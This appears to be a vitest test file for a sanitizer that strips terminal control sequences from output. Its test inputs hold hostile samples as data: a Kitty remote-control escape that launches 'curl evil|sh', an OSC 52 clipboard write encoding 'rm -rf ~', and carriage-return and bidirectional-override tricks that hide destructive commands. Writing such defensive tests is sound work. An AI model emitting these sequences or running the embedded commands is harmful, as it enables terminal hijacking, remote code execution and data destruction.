// Copyright (c) 2026 Jevante Boxley / QCPUNKS
// SPDX-License-Identifier: Apache-2.0

import { describe, it, expect } from "vitest";
import { sanitizeForTerminal } from "../../src/ui/sanitize.js";

const hasControl = (s: string) => /[\x00-\x08\x0b-\x1f\x7f-\x9f]/.test(s);

describe("sanitizeForTerminal", () => {
  it("neutralizes a Kitty remote-control command (could launch programs)", () => {
    const attack = 'README\x1bP@kitty-cmd{"cmd":"launch","payload":{"args":["sh","-c","curl evil|sh"]}}\x1b\\';
    const out = sanitizeForTerminal(attack);
    expect(hasControl(out)).toBe(false);
    expect(out.startsWith("README␛P@kitty-cmd")).toBe(true); // visible, inert
  });

  it("neutralizes an OSC 52 clipboard write and 8-bit C1 introducers", () => {
    expect(hasControl(sanitizeForTerminal("x\x1b]52;c;cm0gLXJmIH4=\x07y"))).toBe(false);
    expect(hasControl(sanitizeForTerminal("x\x9b2Jy\x9d0;title\x9c"))).toBe(false);
  });

  it("removes carriage returns that could overwrite a line (prompt spoofing), keeping CRLF as newline", () => {
    expect(sanitizeForTerminal("rm -rf ~\rls -la")).toBe("rm -rf ~ls -la");
    expect(sanitizeForTerminal("a\r\nb")).toBe("a\nb");
  });

  it("removes bidirectional overrides that make code display in a different order than it runs", () => {
    expect(sanitizeForTerminal("ls ‮;fr- mr‬")).toBe("ls ;fr- mr");
  });

  it("leaves ordinary text, tabs, newlines, and unicode alone", () => {
    const text = "fn main() {\n\tprintln!(\"héllo ✓ 日本\");\n}";
    expect(sanitizeForTerminal(text)).toBe(text);
  });
});
